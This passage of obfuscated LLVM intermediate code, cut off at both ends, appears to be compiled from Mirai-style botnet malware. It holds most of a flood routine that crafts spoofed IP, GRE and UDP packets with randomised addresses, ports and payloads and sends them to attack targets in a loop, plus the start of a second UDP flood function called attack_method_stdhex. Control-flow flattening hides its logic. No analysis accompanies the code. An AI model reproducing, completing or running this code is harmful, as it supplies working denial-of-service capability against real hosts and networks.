  %148 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 -1206848359, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 47, i8* %153, align 1
  %154 = load i32, i32* %21, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %166 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %167 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, 15
  %172 = or i8 %171, 64
  store i8 %172, i8* %169, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, -16
  %177 = or i8 %176, 5
  store i8 %177, i8* %174, align 4
  %178 = load i8, i8* %12, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 28, %182
  %184 = trunc i64 %183 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #8
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = zext i16 %188 to i32
  %190 = xor i32 %189, -1
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #8
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 -1167544979, i32 -1692994041
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  store i32 -1692994041, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 17, i8* %207, align 1
  %208 = call i32 @rand_next()
  %209 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load i8, i8* %20, align 1
  %212 = icmp ne i8 %211, 0
  %213 = select i1 %212, i32 315928222, i32 -761289566
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  store i32 -1791671282, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  %223 = load i32, i32* %222, align 4
  %224 = sub i32 %223, 1024
  %225 = xor i32 %224, -1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 -1791671282, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i16, i16* %16, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #8
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %17, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #8
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 8, %238
  %240 = trunc i64 %239 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #8
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  store i32 -1288188576, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  store i32 1480811124, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 -1010018415, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1176642394, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %9, align 4
  %251 = load i8, i8* %5, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp slt i32 %250, %252
  %254 = select i1 %253, i32 2060200437, i32 58946797
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8*, i8** %256, i64 %258
  %260 = load i8*, i8** %259, align 8
  store i8* %260, i8** %26, align 8
  %261 = load i8*, i8** %26, align 8
  %262 = bitcast i8* %261 to %struct.iphdr*
  store %struct.iphdr* %262, %struct.iphdr** %27, align 8
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i64 1
  %265 = bitcast %struct.iphdr* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %28, align 8
  %266 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %267 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %266, i64 1
  %268 = bitcast %struct.grehdr* %267 to %struct.iphdr*
  store %struct.iphdr* %268, %struct.iphdr** %29, align 8
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i64 1
  %271 = bitcast %struct.iphdr* %270 to %struct.udphdr*
  store %struct.udphdr* %271, %struct.udphdr** %30, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i64 1
  %274 = bitcast %struct.udphdr* %273 to i8*
  store i8* %274, i8** %31, align 8
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 2
  %280 = load i8, i8* %279, align 4
  %281 = zext i8 %280 to i32
  %282 = icmp slt i32 %281, 32
  %283 = select i1 %282, i32 1415839121, i32 685216577
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #8
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #8
  %303 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  store i32 685216577, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %21, align 4
  %307 = icmp eq i32 %306, -1
  %308 = select i1 %307, i32 -230753772, i32 136797279
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = call i32 @rand_next()
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  store i32 %310, i32* %312, align 4
  store i32 136797279, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i16, i16* %13, align 2
  %315 = zext i16 %314 to i32
  %316 = icmp eq i32 %315, 65535
  %317 = select i1 %316, i32 -1166771661, i32 -1281949915
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  %326 = load i16, i16* %325, align 4
  %327 = zext i16 %326 to i32
  %328 = sub nsw i32 %327, 1000
  %329 = xor i32 %328, -1
  %330 = trunc i32 %329 to i16
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i16 %330, i16* %332, align 4
  store i32 -1281949915, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %16, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 997216507, i32 593896366
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 593896366, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %17, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 1489881105, i32 -1685223351
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  store i16 %352, i16* %354, align 2
  store i32 -1685223351, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8, i8* %20, align 1
  %357 = icmp ne i8 %356, 0
  %358 = select i1 %357, i32 -391715533, i32 748355363
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32 @rand_next()
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 9
  store i32 %360, i32* %362, align 4
  store i32 1766322057, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 9
  store i32 %366, i32* %368, align 4
  store i32 1766322057, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* %19, align 1
  %371 = icmp ne i8 %370, 0
  %372 = select i1 %371, i32 1056461387, i32 -1191571831
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %31, align 8
  %375 = load i32, i32* %18, align 4
  call void @rand_str(i8* %374, i32 %375)
  store i32 -1191571831, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 7
  store i16 0, i16* %385, align 2
  %386 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %387 = bitcast %struct.iphdr* %386 to i16*
  %388 = call zeroext i16 @checksum_generic(i16* %387, i32 20)
  %389 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 %388, i16* %390, align 2
  %391 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %392 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %391, i32 0, i32 3
  store i16 0, i16* %392, align 2
  %393 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %395 = bitcast %struct.udphdr* %394 to i8*
  %396 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 2
  %398 = load i16, i16* %397, align 2
  %399 = load i32, i32* %18, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 8, %400
  %402 = trunc i64 %401 to i32
  %403 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %393, i8* %395, i16 zeroext %398, i32 %402)
  %404 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 2
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 0
  store i16 2, i16* %411, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 2
  %421 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %420, i32 0, i32 0
  store i32 %414, i32* %421, align 4
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 1
  store i16 0, i16* %427, align 2
  %428 = load i32, i32* %10, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i32, i32* %18, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 52, %431
  %433 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %434 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = bitcast %struct.sockaddr_in* %438 to %struct.sockaddr*
  store %struct.sockaddr* %439, %struct.sockaddr** %433, align 8
  %440 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %441 = load %struct.sockaddr*, %struct.sockaddr** %440, align 8
  %442 = call i64 @sendto(i32 %428, i8* %429, i64 %432, i32 16384, %struct.sockaddr* %441, i32 16)
  store i32 1569351573, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %9, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %9, align 4
  store i32 -1176642394, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  store i32 -1010018415, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %446, %443, %376, %373, %369, %363, %359, %355, %349, %344, %338, %333, %318, %313, %309, %305, %284, %255, %249, %248, %247, %244, %228, %220, %214, %205, %201, %151, %147, %96, %90, %89, %86, %80, %79, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #7
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #7
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1294)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  store i32 %50, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 341418327, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 341418327, label %first
    i32 669768536, label %53
    i32 1927440940, label %56
    i32 383251715, label %59
    i32 -1030779064, label %60
    i32 105977993, label %66
    i32 1012966753, label %76
    i32 -1040635268, label %85
    i32 332125498, label %94
    i32 -1643690006, label %102
    i32 -1189574356, label %103
    i32 1121736575, label %121
    i32 -1865293965, label %122
    i32 -1554557785, label %132
    i32 1568497165, label %158
    i32 1955301222, label %176
    i32 783766627, label %177
    i32 -1974513088, label %178
    i32 -23039312, label %181
    i32 2060460044, label %185
    i32 319768229, label %186
    i32 175038464, label %192
    i32 -1466654472, label %201
    i32 2114208072, label %205
    i32 -313572964, label %224
    i32 1371664659, label %227
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %51 = icmp eq i32 %.reload, 65535
  %52 = select i1 %51, i32 669768536, i32 1927440940
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = call i32 @rand_next()
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %13, align 2
  store i32 383251715, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i16, i16* %13, align 2
  %58 = call zeroext i16 @htons(i16 zeroext %57) #8
  store i16 %58, i16* %13, align 2
  store i32 383251715, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1030779064, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %9, align 4
  %62 = load i8, i8* %5, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp slt i32 %61, %63
  %65 = select i1 %64, i32 105977993, i32 -23039312
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %68 = load i8**, i8*** %10, align 8
  %69 = load i32, i32* %9, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8*, i8** %68, i64 %70
  store i8* %67, i8** %71, align 8
  %72 = load i16, i16* %12, align 2
  %73 = zext i16 %72 to i32
  %74 = icmp eq i32 %73, 65535
  %75 = select i1 %74, i32 1012966753, i32 -1040635268
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @rand_next()
  %78 = trunc i32 %77 to i16
  %79 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i64 %81
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i32 0, i32 0
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %83, i32 0, i32 1
  store i16 %78, i16* %84, align 2
  store i32 332125498, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i16, i16* %12, align 2
  %87 = call zeroext i16 @htons(i16 zeroext %86) #8
  %88 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %89 = load i32, i32* %9, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i64 %90
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i32 0, i32 0
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %92, i32 0, i32 1
  store i16 %87, i16* %93, align 2
  store i32 332125498, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %96 = load i32*, i32** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i32, i32* %96, i64 %98
  store i32 %95, i32* %99, align 4
  %100 = icmp eq i32 %95, -1
  %101 = select i1 %100, i32 -1643690006, i32 -1189574356
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  ret void

; <label>:103:                                    ; preds = %loopEntry
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %104, align 4
  %105 = load i16, i16* %13, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %108 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %107, i32 0, i32 0
  store i32 0, i32* %108, align 4
  %109 = load i32*, i32** %11, align 8
  %110 = load i32, i32* %9, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %115 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %115, %struct.sockaddr** %114, align 8
  %116 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %117 = load %struct.sockaddr*, %struct.sockaddr** %116, align 8
  %118 = call i32 @bind(i32 %113, %struct.sockaddr* %117, i32 16) #7
  %119 = icmp eq i32 %118, -1
  %120 = select i1 %119, i32 1121736575, i32 -1865293965
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  store i32 -1865293965, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %123, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %129, 32
